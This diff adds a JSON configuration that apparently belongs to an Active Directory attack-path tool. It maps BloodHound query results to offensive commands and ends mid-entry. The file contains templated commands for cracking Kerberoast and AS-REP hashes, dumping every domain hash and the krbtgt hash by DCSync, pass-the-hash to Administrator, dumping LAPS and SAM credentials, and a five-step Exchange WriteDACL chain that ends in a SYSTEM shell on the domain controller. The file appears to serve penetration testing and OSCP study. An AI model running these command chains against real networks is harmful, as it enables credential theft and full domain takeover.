@@ -1,0 +1,1086 @@
+{
+  "lateral-adminto-nonpriv": {
+    "commands": [
+      "impacket-psexec",
+      "impacket-wmiexec",
+      "impacket-smbexec"
+    ],
+    "access_type": "AdminTo",
+    "array_field": "AdminOnComputers",
+    "array_ip_field": "AdminOnIPs",
+    "user_field": "User",
+    "permissions_required": "Local admin on target (AdminTo edge)"
+  },
+  "lateral-all-admins-per-computer": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "AdminTo",
+    "user_array_field": "LocalAdmins",
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "filter_groups": true,
+    "permissions_required": "Local admin on target (AdminTo edge)"
+  },
+  "lateral-rdp-targets": {
+    "commands": [
+      "xfreerdp-connect"
+    ],
+    "access_type": "CanRDP",
+    "array_field": "RDPTargets",
+    "array_ip_field": "RDPIPs",
+    "user_field": "User",
+    "permissions_required": "Remote Desktop Users or Administrators group"
+  },
+  "lateral-psremote-targets": {
+    "commands": [
+      "evil-winrm-shell"
+    ],
+    "access_type": "CanPSRemote",
+    "array_field": "PSRemoteTargets",
+    "array_ip_field": "PSRemoteIPs",
+    "user_field": "User",
+    "permissions_required": "Remote Management Users or Administrators group"
+  },
+  "lateral-dcom-targets": {
+    "commands": [
+      "impacket-wmiexec"
+    ],
+    "access_type": "ExecuteDCOM",
+    "array_field": "DCOMTargets",
+    "array_ip_field": "DCOMIPs",
+    "user_field": "User",
+    "permissions_required": "DCOM execution rights on target"
+  },
+  "lateral-da-sessions-workstations": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "HasSession",
+    "target_field": "Workstation",
+    "target_ip_field": "WorkstationIP",
+    "array_field": "PrivilegedSessions",
+    "context": "Credential harvest - privileged session on target",
+    "permissions_required": "Local admin on workstation to dump creds"
+  },
+  "lateral-sessions-on-computer": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "HasSession",
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "user_field": "LoggedOnUser",
+    "context": "Credential harvest opportunity",
+    "permissions_required": "Local admin on target to dump creds"
+  },
+  "lateral-user-access-all": {
+    "commands": [
+      "impacket-psexec",
+      "evil-winrm-shell",
+      "xfreerdp-connect"
+    ],
+    "target_field": "Target",
+    "target_ip_field": "TargetIP",
+    "access_type_field": "AccessType",
+    "permissions_required": "Varies by access type (AdminTo/CanRDP/CanPSRemote)"
+  },
+  "lateral-domain-users-admin": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "AdminTo",
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "context": "Domain Users = local admin (any user can compromise)",
+    "permissions_required": "Any domain user (misconfigured local admin)"
+  },
+  "lateral-da-sessions": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "HasSession",
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "context": "DA session - prime mimikatz target",
+    "permissions_required": "Local admin on target to dump creds"
+  },
+  "quick-asrep-roastable": {
+    "commands": [
+      "impacket-getnpusers-asreproast"
+    ],
+    "access_type": null,
+    "discovery_command": true,
+    "auth_free": true,
+    "target_field": "User",
+    "context": "AS-REP roast - no auth required",
+    "permissions_required": "None (pre-auth disabled on target)",
+    "post_success": [
+      {
+        "description": "Crack the hash",
+        "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
+      },
+      {
+        "description": "Validate credentials",
+        "command": "crackmapexec smb <DC_IP> -u '<CRACKED_USER>' -p '<PASSWORD>'"
+      },
+      {
+        "description": "Check user access",
+        "command": "bloodtrail --run-query owned-what-can-access --var USER=<CRACKED_USER>@<DOMAIN>"
+      },
+      {
+        "description": "Mark as owned in BloodHound",
+        "command": null
+      }
+    ]
+  },
+  "quick-kerberoastable": {
+    "commands": [
+      "impacket-getuserspns-kerberoast"
+    ],
+    "access_type": null,
+    "discovery_command": true,
+    "target_field": "ServiceAccount",
+    "context": "Kerberoast - request TGS for offline cracking",
+    "permissions_required": "Any authenticated domain user",
+    "post_success": [
+      {
+        "description": "Crack the hash",
+        "command": "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt"
+      },
+      {
+        "description": "Validate credentials",
+        "command": "crackmapexec smb <DC_IP> -u '<CRACKED_USER>' -p '<PASSWORD>'"
+      },
+      {
+        "description": "Check user access",
+        "command": "bloodtrail --run-query owned-what-can-access --var USER=<CRACKED_USER>@<DOMAIN>"
+      },
+      {
+        "description": "Mark as owned in BloodHound",
+        "command": null
+      }
+    ]
+  },
+  "quick-kerberoastable-privileged": {
+    "commands": [],
+    "access_type": null,
+    "discovery_command": true,
+    "target_field": "HighValueTarget",
+    "context": "Priority target - crack this hash first",
+    "permissions_required": "Any authenticated domain user"
+  },
+  "quick-unconstrained-delegation": {
+    "commands": [
+      "rubeus-monitor"
+    ],
+    "access_type": null,
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "context": "Unconstrained delegation - monitor for TGT capture",
+    "permissions_required": "Local admin on unconstrained delegation host"
+  },
+  "quick-constrained-delegation": {
+    "commands": [
+      "rubeus-s4u-impersonate",
+      "impacket-getST-constrained"
+    ],
+    "access_type": null,
+    "target_field": "Principal",
+    "context": "Constrained delegation - S4U2Self/S4U2Proxy",
+    "permissions_required": "Control of delegating principal (password/hash/TGT)"
+  },
+  "quick-password-in-description": {
+    "commands": [
+      "crackmapexec-smb-spray",
+      "evil-winrm-shell"
+    ],
+    "access_type": null,
+    "target_field": "User",
+    "target_is_dc": true,
+    "user_is_discovered": true,
+    "context": "Password in description - validate and use",
+    "permissions_required": "LDAP read access (any domain user)",
+    "post_success": [
+      {
+        "description": "Validate the password from description",
+        "command": "crackmapexec smb <DC_IP> -u '<USER>' -p '<PASSWORD_FROM_DESC>'"
+      },
+      {
+        "description": "Check user access",
+        "command": "bloodtrail --run-query owned-what-can-access --var USER=<USER>@<DOMAIN>"
+      },
+      {
+        "description": "Mark as owned in BloodHound",
+        "command": null
+      }
+    ],
+    "discovery_command": true
+  },
+  "privesc-dcsync-rights": {
+    "commands": [
+      "ad-dcsync-impacket-secretsdump-user"
+    ],
+    "access_type": "DCSync",
+    "principal_field": "Principal",
+    "filter_groups": true,
+    "domain_level": true,
+    "context": "DCSync - dump domain hashes",
+    "permissions_required": "GetChanges + GetChangesAll on domain object",
+    "post_success": [
+      {
+        "description": "Dump all hashes",
+        "command": "impacket-secretsdump -just-dc <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>"
+      },
+      {
+        "description": "Extract krbtgt hash for Golden Ticket",
+        "command": "impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>"
+      },
+      {
+        "description": "Pass-the-Hash as Administrator",
+        "command": "impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<TARGET>"
+      }
+    ]
+  },
+  "privesc-genericall-highvalue": {
+    "commands": [
+      "crackmapexec-smb-spray"
+    ],
+    "access_type": "GenericAll",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "GenericAll - reset password or add to group",
+    "permissions_required": "GenericAll ACL on target object"
+  },
+  "privesc-shadow-admins": {
+    "commands": [
+      "ad-dcsync-impacket-secretsdump-user"
+    ],
+    "access_type": "GenericAll",
+    "user_field": "Attacker",
+    "target_field": "Victim",
+    "context": "Shadow admin - control over DA",
+    "permissions_required": "GenericAll over privileged user/group"
+  },
+  "privesc-force-change-password": {
+    "commands": [
+      "crackmapexec-smb-spray"
+    ],
+    "access_type": "ForceChangePassword",
+    "user_field": "Attacker",
+    "target_field": "Victim",
+    "context": "ForceChangePassword - reset and use",
+    "permissions_required": "User-Force-Change-Password extended right"
+  },
+  "privesc-genericwrite": {
+    "commands": [
+      "impacket-getuserspns-kerberoast"
+    ],
+    "access_type": "GenericWrite",
+    "user_field": "Attacker",
+    "target_field": "Victim",
+    "context": "GenericWrite - add SPN then Kerberoast",
+    "permissions_required": "GenericWrite on target user"
+  },
+  "privesc-add-member": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "AddMember",
+    "user_field": "Attacker",
+    "target_field": "Group",
+    "context": "AddMember - add self to admin group",
+    "permissions_required": "AddMember/WriteProperty on group"
+  },
+  "privesc-readgmsapassword": {
+    "commands": [
+      "gmsadumper",
+      "evil-winrm-shell"
+    ],
+    "access_type": "ReadGMSAPassword",
+    "user_field": "Reader",
+    "target_field": "GMSA",
+    "context": "Read GMSA password - use for access",
+    "permissions_required": "In PrincipalsAllowedToRetrieveManagedPassword"
+  },
+  "chain-shortest-to-da": "BUILD_SEQUENCE",
+  "chain-all-paths-to-da": "BUILD_SEQUENCE",
+  "chain-owned-to-pivot-to-da": {
+    "commands": [
+      "impacket-psexec",
+      "evil-winrm-shell"
+    ],
+    "target_field": "PivotMachine",
+    "target_ip_field": "PivotMachineIP",
+    "user_field": "OwnedUser",
+    "context": "Pivot through machine to harvest DA credentials",
+    "permissions_required": "Owned user with AdminTo on pivot"
+  },
+  "chain-credential-harvest": {
+    "commands": [
+      "secretsdump-sam",
+      "mimikatz-lsass"
+    ],
+    "target_field": "TargetMachine",
+    "target_ip_field": "TargetMachineIP",
+    "user_field": "OwnedUser",
+    "context": "Harvest DA credentials from shared admin machine",
+    "permissions_required": "Local admin on target to dump credentials"
+  },
+  "chain-complete-compromise": "BUILD_SEQUENCE",
+  "chain-lateral-to-privilege": "BUILD_SEQUENCE",
+  "pwned-machine-access": {
+    "commands": [
+      "impacket-psexec",
+      "impacket-wmiexec",
+      "evil-winrm-shell",
+      "xfreerdp-connect"
+    ],
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "user_field": "User",
+    "access_type_field": "AccessType",
+    "context": "Lateral movement to machines accessible by pwned users",
+    "permissions_required": "Pwned user credentials + their access rights"
+  },
+  "pwned-sessions-from-machines": {
+    "commands": [
+      "secretsdump-ntds",
+      "mimikatz-lsass"
+    ],
+    "target_field": "TargetMachine",
+    "target_ip_field": "TargetMachineIP",
+    "user_field": "PwnedUser",
+    "context": "Credential harvesting from accessible machines with victim sessions",
+    "permissions_required": "Local admin on target to dump credentials"
+  },
+  "pwned-cred-harvest-targets": {
+    "commands": [
+      "secretsdump-sam",
+      "mimikatz-lsass"
+    ],
+    "target_field": "HarvestFrom",
+    "target_ip_field": "HarvestFromIP",
+    "user_field": "Attacker",
+    "context": "High-value credential harvest targets (admincount=true sessions)",
+    "permissions_required": "Local admin on target to dump credentials"
+  },
+  "pwned-lateral-targets": {
+    "commands": [
+      "impacket-psexec",
+      "secretsdump-sam"
+    ],
+    "target_field": "TargetMachine",
+    "target_ip_field": "TargetMachineIP",
+    "context": "Next lateral movement targets with non-pwned user sessions",
+    "permissions_required": "Pwned user with admin access to target"
+  },
+  "owned-what-can-access": {
+    "commands": [
+      "impacket-psexec",
+      "evil-winrm-shell",
+      "xfreerdp-connect"
+    ],
+    "target_field": "Target",
+    "target_ip_field": "TargetIP",
+    "access_type_field": "AccessType",
+    "permissions_required": "Owned user credentials + their access rights"
+  },
+  "owned-path-to-da": "BUILD_SEQUENCE",
+  "owned-first-hop": {
+    "commands": [
+      "impacket-psexec",
+      "evil-winrm-shell"
+    ],
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "permissions_required": "Owned user credentials + their access rights"
+  },
+  "owned-admin-on": {
+    "commands": [
+      "impacket-psexec",
+      "impacket-wmiexec"
+    ],
+    "access_type": "AdminTo",
+    "target_field": "Target",
+    "permissions_required": "Owned user with AdminTo on target"
+  },
+  "owned-cred-harvest-targets": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "HasSession",
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "context": "Credential harvest from DA session",
+    "permissions_required": "Local admin on target to dump creds"
+  },
+  "delegation-rbcd-targets": {
+    "commands": [
+      "rbcd-getST",
+      "rubeus-s4u-impersonate"
+    ],
+    "access_type": "AllowedToAct",
+    "target_field": "RBCDTarget",
+    "target_ip_field": "RBCDTargetIP",
+    "array_field": "AllowedPrincipals",
+    "context": "RBCD - impersonate users to target",
+    "permissions_required": "Control of principal in msDS-AllowedToActOnBehalfOfOtherIdentity"
+  },
+  "delegation-rbcd-writers": {
+    "commands": [
+      "rbcd-set-msds",
+      "bloodyad-rbcd"
+    ],
+    "access_type": "WriteAccountRestrictions",
+    "user_field": "Attacker",
+    "target_field": "TargetComputer",
+    "target_ip_field": "TargetComputerIP",
+    "context": "Can configure RBCD on target computer",
+    "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity"
+  },
+  "delegation-constrained-abuse": {
+    "commands": [
+      "rubeus-s4u-impersonate",
+      "impacket-getST-constrained"
+    ],
+    "access_type": "AllowedToDelegate",
+    "user_field": "DelegatingPrincipal",
+    "array_field": "DelegationTargets",
+    "context": "Constrained delegation - S4U2Self/S4U2Proxy",
+    "permissions_required": "Control of delegating principal (password/hash/TGT)"
+  },
+  "delegation-constrained-to-dc": {
+    "commands": [
+      "rubeus-s4u-impersonate",
+      "impacket-getST-constrained"
+    ],
+    "access_type": "AllowedToDelegate",
+    "user_field": "DelegatingPrincipal",
+    "target_field": "DomainController",
+    "target_ip_field": "DomainControllerIP",
+    "context": "Constrained delegation to DC - high value",
+    "permissions_required": "Control of delegating principal (password/hash/TGT)"
+  },
+  "delegation-unconstrained": {
+    "commands": [
+      "rubeus-monitor",
+      "rubeus-tgtdeleg"
+    ],
+    "access_type": null,
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "context": "Unconstrained delegation - TGT capture target",
+    "permissions_required": "Local admin on unconstrained delegation host"
+  },
+  "delegation-unconstrained-nondc": {
+    "commands": [
+      "rubeus-monitor",
+      "petitpotam-coerce",
+      "coercer-coerce"
+    ],
+    "access_type": null,
+    "target_field": "Computer",
+    "target_ip_field": "ComputerIP",
+    "context": "Non-DC unconstrained - coerce + capture TGT",
+    "permissions_required": "Local admin on unconstrained host + coercion capability"
+  },
+  "delegation-user-unconstrained": {
+    "commands": [
+      "rubeus-monitor"
+    ],
+    "access_type": null,
+    "user_field": "User",
+    "context": "User with unconstrained delegation",
+    "permissions_required": "Control of user with unconstrained delegation"
+  },
+  "delegation-rbcd-chain": {
+    "commands": [
+      "rbcd-set-msds",
+      "rbcd-getST"
+    ],
+    "access_type": "WriteAccountRestrictions",
+    "user_field": "Attacker",
+    "target_field": "TargetComputer",
+    "target_ip_field": "TargetComputerIP",
+    "array_field": "PrivilegedSessions",
+    "context": "Full RBCD chain - write + impersonate to cred harvest",
+    "permissions_required": "WriteProperty on target + control of computer account"
+  },
+  "delegation-add-allowed-to-act": {
+    "commands": [
+      "rbcd-set-msds"
+    ],
+    "access_type": "AddAllowedToAct",
+    "user_field": "Attacker",
+    "target_field": "TargetComputer",
+    "target_ip_field": "TargetComputerIP",
+    "context": "AddAllowedToAct - configure RBCD directly",
+    "permissions_required": "AddAllowedToAct permission on target computer"
+  },
+  "delegation-protocol-transition": {
+    "commands": [
+      "rubeus-s4u-impersonate",
+      "impacket-getST-constrained"
+    ],
+    "access_type": "AllowedToDelegate",
+    "user_field": "Principal",
+    "context": "Protocol transition - S4U2Self without user auth",
+    "permissions_required": "Control of principal with TRUSTED_TO_AUTH_FOR_DELEGATION"
+  },
+  "adcs-esc1-vulnerable": {
+    "commands": [
+      "certipy-req-esc1"
+    ],
+    "access_type": "ADCSESC1",
+    "user_field": "Attacker",
+    "target_field": "VulnerableTemplate",
+    "context": "ESC1 - Request certificate as any user",
+    "permissions_required": "Enroll rights on vulnerable template"
+  },
+  "adcs-esc3-enrollment-agents": {
+    "commands": [
+      "certipy-req-esc1"
+    ],
+    "access_type": "ADCSESC3",
+    "user_field": "Attacker",
+    "target_field": "AgentTemplate",
+    "context": "ESC3 - Enrollment agent abuse",
+    "permissions_required": "Enrollment agent certificate"
+  },
+  "adcs-esc4-template-write": {
+    "commands": [
+      "certipy-req-esc4"
+    ],
+    "access_type": "ADCSESC4",
+    "user_field": "Attacker",
+    "target_field": "ModifiableTemplate",
+    "context": "ESC4 - Modify template for ESC1",
+    "permissions_required": "WriteProperty/WriteDacl on certificate template"
+  },
+  "adcs-esc5-pki-object-acls": {
+    "commands": [
+      "certipy-find"
+    ],
+    "access_type": "ADCSESC5",
+    "user_field": "Attacker",
+    "target_field": "PKIObject",
+    "context": "ESC5 - PKI object ACL abuse",
+    "permissions_required": "WriteProperty/WriteDacl on PKI objects"
+  },
+  "adcs-esc6a-editf-flag": {
+    "commands": [
+      "certipy-req-esc1"
+    ],
+    "access_type": "ADCSESC6a",
+    "user_field": "Attacker",
+    "target_field": "VulnerableCA",
+    "context": "ESC6a - EDITF_ATTRIBUTESUBJECTALTNAME2 enabled",
+    "permissions_required": "Enroll rights on any template (CA misconfigured)"
+  },
+  "adcs-esc6b-issuance-requirements": {
+    "commands": [
+      "certipy-req-esc1"
+    ],
+    "access_type": "ADCSESC6b",
+    "user_field": "Attacker",
+    "target_field": "VulnerableCA",
+    "context": "ESC6b - Weak issuance requirements",
+    "permissions_required": "Enroll rights (weak manager approval)"
+  },
+  "adcs-esc7-ca-acls": {
+    "commands": [
+      "certipy-req-esc7"
+    ],
+    "access_type": "ADCSESC7",
+    "user_field": "Attacker",
+    "target_field": "TargetCA",
+    "context": "ESC7 - ManageCA rights abuse",
+    "permissions_required": "ManageCA or ManageCertificates on CA"
+  },
+  "adcs-esc9a-no-security-extension": {
+    "commands": [
+      "certipy-req-esc1",
+      "certipy-auth"
+    ],
+    "access_type": "ADCSESC9a",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "ESC9a - No security extension bypass",
+    "permissions_required": "GenericWrite on target + enroll rights"
+  },
+  "adcs-esc9b-weak-mapping": {
+    "commands": [
+      "certipy-req-esc1",
+      "certipy-auth"
+    ],
+    "access_type": "ADCSESC9b",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "ESC9b - Weak certificate mapping",
+    "permissions_required": "GenericWrite on target + enroll rights"
+  },
+  "adcs-esc10a-weak-cert-binding": {
+    "commands": [
+      "certipy-req-esc1",
+      "certipy-auth"
+    ],
+    "access_type": "ADCSESC10a",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "ESC10a - Weak certificate binding",
+    "permissions_required": "Enroll rights (StrongCertificateBindingEnforcement=0)"
+  },
+  "adcs-esc10b-shadow-credentials": {
+    "commands": [
+      "certipy-shadow"
+    ],
+    "access_type": "ADCSESC10b",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "ESC10b - Shadow credentials via ADCS",
+    "permissions_required": "GenericWrite on target for msDS-KeyCredentialLink"
+  },
+  "adcs-esc13-oid-group": {
+    "commands": [
+      "certipy-req-esc1"
+    ],
+    "access_type": "ADCSESC13",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "ESC13 - OID group link privilege escalation",
+    "permissions_required": "Enroll on template with issuance policy linked to group"
+  },
+  "adcs-golden-cert": {
+    "commands": [
+      "certipy-forge"
+    ],
+    "access_type": "GoldenCert",
+    "user_field": "Attacker",
+    "target_field": "CompromisedCA",
+    "domain_level": true,
+    "context": "Golden Certificate - CA key compromise",
+    "permissions_required": "CA private key (backup/DVCD/local admin on CA)"
+  },
+  "adcs-enroll-on-behalf": {
+    "commands": [
+      "certipy-req-esc1"
+    ],
+    "access_type": "EnrollOnBehalfOf",
+    "user_field": "EnrollmentAgent",
+    "target_field": "Victim",
+    "context": "Enrollment agent impersonation",
+    "permissions_required": "Valid enrollment agent certificate"
+  },
+  "adcs-enrollment-targets": {
+    "commands": [
+      "certipy-req-esc1",
+      "certify-request"
+    ],
+    "access_type": "Enroll",
+    "user_field": "Principal",
+    "target_field": "Template",
+    "context": "Certificate enrollment rights",
+    "permissions_required": "Enroll permission on template"
+  },
+  "adcs-manage-ca": {
+    "commands": [
+      "certipy-req-esc7"
+    ],
+    "access_type": "ManageCA",
+    "user_field": "Attacker",
+    "target_field": "TargetCA",
+    "context": "CA management rights",
+    "permissions_required": "ManageCA right on Certificate Authority"
+  },
+  "adcs-ca-servers": {
+    "commands": [
+      "certipy-find",
+      "certify-find"
+    ],
+    "access_type": null,
+    "target_field": "CAServer",
+    "context": "Certificate Authority enumeration",
+    "discovery_command": true,
+    "permissions_required": "Any authenticated domain user"
+  },
+  "adcs-certificate-templates": {
+    "commands": [
+      "certipy-find",
+      "certify-find"
+    ],
+    "access_type": null,
+    "target_field": "Template",
+    "context": "Certificate template enumeration",
+    "discovery_command": true,
+    "permissions_required": "Any authenticated domain user"
+  },
+  "adcs-all-esc-paths": {
+    "commands": [
+      "certipy-find"
+    ],
+    "access_type": null,
+    "context": "All ESC attack paths summary",
+    "discovery_command": true,
+    "permissions_required": "Any authenticated domain user"
+  },
+  "adcs-ntauth-store": {
+    "commands": [
+      "certipy-find"
+    ],
+    "access_type": "GenericAll",
+    "user_field": "Attacker",
+    "target_field": "NTAuthStore",
+    "context": "NTAuthCertificates modification rights",
+    "permissions_required": "GenericAll on NTAuthCertificates container"
+  },
+  "lateral-coerce-to-tgt": {
+    "commands": [
+      "petitpotam-coerce",
+      "coercer-coerce",
+      "printerbug-trigger",
+      "dfscoerce-trigger"
+    ],
+    "access_type": "CoerceToTGT",
+    "listener_field": "CoercionHost",
+    "listener_ip_field": "CoercionHostIP",
+    "target_field": "CanCaptureTGTFrom",
+    "is_coercion": true,
+    "context": "Coerce authentication to capture TGT",
+    "permissions_required": "Network access to target + listener on unconstrained host"
+  },
+  "lateral-sid-history": {
+    "commands": [
+      "impacket-psexec",
+      "impacket-wmiexec"
+    ],
+    "access_type": "HasSIDHistory",
+    "user_field": "Principal",
+    "target_field": "HasSIDOf",
+    "context": "SID History grants inherited permissions",
+    "permissions_required": "Control of principal with SID history"
+  },
+  "lateral-trust-abuse": {
+    "commands": [
+      "impacket-psexec"
+    ],
+    "access_type": "TrustedBy",
+    "user_field": "TrustingDomain",
+    "target_field": "TrustedDomain",
+    "context": "Cross-domain trust relationship",
+    "permissions_required": "Domain admin in trusting domain (for golden ticket)"
+  },
+  "privesc-write-spn": {
+    "commands": [
+      "impacket-getuserspns-kerberoast"
+    ],
+    "access_type": "WriteSPN",
+    "user_field": "Attacker",
+    "target_field": "Target",
+    "context": "Add SPN for targeted Kerberoasting",
+    "permissions_required": "WriteProperty on servicePrincipalName"
+  },
+  "privesc-write-account-restrictions": {
+    "commands": [
+      "rbcd-set-msds",
+      "bloodyad-rbcd"
+    ],
+    "access_type": "WriteAccountRestrictions",
+    "user_field": "Attacker",
+    "target_field": "RBCDTarget",
+    "target_ip_field": "RBCDTargetIP",
+    "context": "Configure RBCD on computer",
+    "permissions_required": "WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity"
+  },
+  "privesc-sync-laps": {
+    "commands": [
+      "laps-password-cme",
+      "laps-password-ldapsearch"
+    ],
+    "access_type": "SyncLAPSPassword",
+    "user_field": "Principal",
+    "array_field": "Computers",
+    "array_ip_field": "ComputerIPs",
+    "domain_level": true,
+    "context": "Domain-wide LAPS sync rights",
+    "permissions_required": "SyncLAPSPassword extended right (domain-wide)"
+  },
+  "privesc-add-allowed-to-act": {
+    "commands": [
+      "rbcd-set-msds"
+    ],
+    "access_type": "AddAllowedToAct",
+    "user_field": "Attacker",
+    "target_field": "RBCDTarget",
+    "target_ip_field": "RBCDTargetIP",
+    "context": "AddAllowedToAct - configure RBCD",
+    "permissions_required": "AddAllowedToAct extended right on target"
+  },
+  "privesc-dcsync-composite": {
+    "commands": [
+      "ad-dcsync-impacket-secretsdump-user"
+    ],
+    "access_type": "DCSync",
+    "user_field": "DCSync_Principal",
+    "target_field": "Domain",
+    "domain_level": true,
+    "context": "Full DCSync rights (GetChanges+GetChangesAll)",
+    "permissions_required": "GetChanges + GetChangesAll on domain object"
+  },
+  "quick-gmsa-password": {
+    "commands": [
+      "gmsadumper",
+      "bloodyad-gmsa"
+    ],
+    "access_type": "ReadGMSAPassword",
+    "user_field": "Attacker",
+    "target_field": "GMSAAccount",
+    "context": "Read gMSA password - cleartext credential",
+    "permissions_required": "In PrincipalsAllowedToRetrieveManagedPassword",
+    "post_success": [
+      {
+        "description": "Use gMSA credentials",
+        "command": "crackmapexec smb <TARGET> -u '<GMSA_NAME>$' -p '<GMSA_PASSWORD>'"
+      },
+      {
+        "description": "Check gMSA access",
+        "command": "bloodtrail --run-query owned-what-can-access --var USER=<GMSA_NAME>$@<DOMAIN>"
+      },
+      {
+        "description": "gMSA often has elevated privileges",
+        "command": null
+      }
+    ]
+  },
+  "quick-laps-readers": {
+    "commands": [
+      "laps-password-cme",
+      "laps-password-ldapsearch"
+    ],
+    "access_type": "ReadLAPSPassword",
+    "user_field": "Attacker",
+    "array_field": "Computers",
+    "array_ip_field": "ComputerIPs",
+    "context": "Read LAPS password - local admin creds",
+    "permissions_required": "Read access to ms-mcs-AdmPwd attribute",
+    "post_success": [
+      {
+        "description": "Read LAPS password",
+        "command": "crackmapexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M laps"
+      },
+      {
+        "description": "Use local admin creds",
+        "command": "crackmapexec smb <TARGET> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth"
+      },
+      {
+        "description": "Dump creds from target",
+        "command": "crackmapexec smb <TARGET> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth --sam"
+      }
+    ]
+  },
+  "quick-gmsa-all": {
+    "commands": [
+      "gmsadumper"
+    ],
+    "access_type": null,
+    "target_field": "GMSAAccount",
+    "context": "gMSA enumeration",
+    "discovery_command": true,
+    "permissions_required": "Any authenticated domain user (enumeration only)"
+  },
+  "prereq-account-operators": {
+    "commands": [],
+    "access_type": null,
+    "user_field": "User",
+    "context": "Account Operators membership check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-exchange-writedacl": {
+    "commands": [],
+    "access_type": "WriteDacl",
+    "target_field": "Domain",
+    "context": "Exchange Windows Permissions WriteDACL check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-backup-operators": {
+    "commands": [],
+    "access_type": null,
+    "user_field": "User",
+    "context": "Backup Operators membership check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-server-operators": {
+    "commands": [],
+    "access_type": null,
+    "user_field": "User",
+    "context": "Server Operators membership check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-can-add-to-group": {
+    "commands": [],
+    "access_type": "AddMember",
+    "user_field": "User",
+    "target_field": "TargetGroup",
+    "context": "AddMember permission check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "attack-chain-exchange-writedacl-dcsync": {
+    "commands": [
+      "net-user-add",
+      "net-group-add",
+      "powerview-add-dcsync",
+      "ad-dcsync-impacket-secretsdump-user",
+      "impacket-psexec"
+    ],
+    "access_type": "WriteDacl",
+    "context": "Exchange WriteDACL to DCSync - Full Attack Chain",
+    "permissions_required": "Account Operators membership (nested) + Exchange Windows Permissions has WriteDACL on domain",
+    "prerequisite_queries": [
+      "prereq-account-operators",
+      "prereq-exchange-writedacl"
+    ],
+    "attack_chain": {
+      "id": "exchange-writedacl-dcsync",
+      "name": "Exchange WriteDACL to DCSync",
+      "description": "Abuse Account Operators to add user to Exchange Windows Permissions, then use WriteDACL to grant DCSync rights",
+      "severity": "critical",
+      "oscp_relevance": "high",
+      "steps": [
+        {
+          "step_id": 1,
+          "name": "Create controlled domain user",
+          "why": "Account Operators can create domain users. We need a user we fully control.",
+          "command": "net-user-add",
+          "context": "on_target",
+          "verification": "net user <NEWUSER> /domain"
+        },
+        {
+          "step_id": 2,
+          "name": "Add user to Exchange Windows Permissions",
+          "why": "Exchange Windows Permissions group has WriteDACL on the domain. Account Operators can add to non-protected groups.",
+          "command": "net-group-add",
+          "context": "on_target",
+          "group": "Exchange Windows Permissions",
+          "verification": "net group \"Exchange Windows Permissions\" /domain"
+        },
+        {
+          "step_id": 3,
+          "name": "Grant DCSync rights via WriteDACL",
+          "why": "WriteDACL allows modifying the domain's DACL. We add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.",
+          "command": "powerview-add-dcsync",
+          "context": "on_target",
+          "prerequisites": [
+            "PowerView.ps1 uploaded"
+          ]
+        },
+        {
+          "step_id": 4,
+          "name": "Execute DCSync attack",
+          "why": "With replication rights, we can request the domain's replication data including all password hashes.",
+          "command": "ad-dcsync-impacket-secretsdump-user",
+          "context": "kali",
+          "result": "Administrator NTLM hash"
+        },
+        {
+          "step_id": 5,
+          "name": "Pass-the-Hash for SYSTEM",
+          "why": "With the Administrator hash, we can authenticate to the DC and get SYSTEM access.",
+          "command": "impacket-psexec",
+          "context": "kali",
+          "result": "SYSTEM shell on Domain Controller"
+        }
+      ]
+    },
+    "post_success": [
+      {
+        "description": "Dump all domain hashes",
+        "command": "impacket-secretsdump -just-dc <DOMAIN>/<NEWUSER>:'<PASSWORD>'@<DC_IP>"
+      },
+      {
+        "description": "Pass-the-Hash as Administrator",
+        "command": "impacket-psexec -hashes :<ADMIN_NTLM> <DOMAIN>/Administrator@<DC_IP>"
+      },
+      {
+        "description": "Alternative: evil-winrm with hash",
+        "command": "evil-winrm -i <DC_IP> -u Administrator -H <ADMIN_NTLM>"
+      }
+    ]
+  },
+  "attack-chain-genericall-password-reset": {
+    "commands": [
+      "net-user-password-reset",
+      "evil-winrm-shell"
+    ],
+    "access_type": "GenericAll",
+    "context": "GenericAll to Password Reset - Quick Win",
+    "permissions_required": "GenericAll ACL on target user",
+    "prerequisite_queries": [],
+    "attack_chain": {
+      "id": "genericall-password-reset",
+      "name": "GenericAll Password Reset",
